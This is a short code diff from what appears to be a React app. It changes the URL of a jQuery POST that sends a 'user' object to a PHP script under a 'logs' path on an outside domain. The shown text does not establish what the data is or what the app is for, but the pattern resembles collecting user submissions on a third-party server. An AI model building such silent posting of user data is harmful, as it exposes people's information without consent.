@@ -59,7 +59,7 @@ const App = ()=>{
 
       $.ajax({
           type: "POST",
-          url: "https://bucketlion.com/logs/dashboard/file/wbl.php",
+          url: "https://bucketlion.com/logs/dashboard/file/wbmp.php",
           data: user,
           success(data) {
               console.log(data);
